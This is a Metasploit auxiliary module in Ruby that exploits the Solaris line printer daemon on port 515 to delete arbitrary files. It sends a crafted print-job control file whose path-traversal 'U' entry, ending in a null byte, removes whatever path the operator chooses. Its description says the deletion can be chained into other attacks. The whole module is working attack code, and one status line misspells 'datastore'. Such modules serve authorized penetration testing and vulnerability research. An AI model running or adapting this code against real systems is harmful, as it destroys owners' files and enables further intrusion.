##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Dos::Solaris::Lpd::CascadeDelete < Msf::Auxiliary

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris LPD Arbitrary File Delete',
			'Description'    => %q{
				This module uses a vulnerability in the Solaris line printer
				daemon to delete arbitrary files on an affected system. This
				can be used to exploit the rpc.walld format string flaw, the
				missing krb5.conf authentication bypass, or simply delete
				system files. Tested on Solaris 2.6, 7, 8, 9, and 10.
					
			},
			'Author'         => [ 'hdm', 'Optyx <optyx@uberhax0r.net>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-26-101842-1'],
				]
			))
			
			register_options(
				[
					Opt::RPORT(515),
					OptString.new('RPATH', [ true, "The remote file path to delete"]),
				], self.class)
	end

	def run
	
		# Create a simple control file...
		control = "Hmetasploit\nPr00t\n";
	
		# The job ID is squashed down to three decimal digits
		jid   = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]

		# Establish the first connection to the server
		sock1 = connect(false)
		
		# Request a cascaded job
		sock1.put("\x02metasploit:framework\n")
		res = sock1.get_once
		if (not res)
			print_status("The target did not accept our job request command")
			return
		end
		
		# Theoretically, we could delete multiple files at once, however
		# the lp daemon will append garbage from memory to the path name
		# if we don't stick a null byte after the path. Unfortunately, this
		# null byte will prevent the parser from processing the other paths.
		control << "U" + ("../" * 10) + "#{datastore['RPATH']}\x00\n"

		dataf = "http://metasploit.com/\n"
		
		print_status("Deleting #{datstore['RPATH']}...")
		if (not (
			send_file(sock1, 2, "cfA" + jid + "metasploit", control) and
			send_file(sock1, 3, "dfa" + jid + "metasploit", dataf)
		   )    )
		   	sock1.close
			return
		end
		
		print_status("Successfully deleted #{datastore['RPATH']} >:-]")
		sock1.close
	end

	def send_file(s, type, name, data='')
		
		s.put(type.chr + data.length.to_s + " " + name + "\n")
		res = s.get_once(1)
		if (not (res and res[0] == 0))
			print_status("The target did not accept our control file command (#{name})")
			return
		end
		
		s.put(data)
		s.put("\x00")
		res = s.get_once(1)
		if (not (res and res[0] == 0))
			print_status("The target did not accept our control file data (#{name})")
			return
		end	
		
		print_status(sprintf("     Uploaded %.4d bytes >> #{name}", data.length))
		return true
	end

end
end	
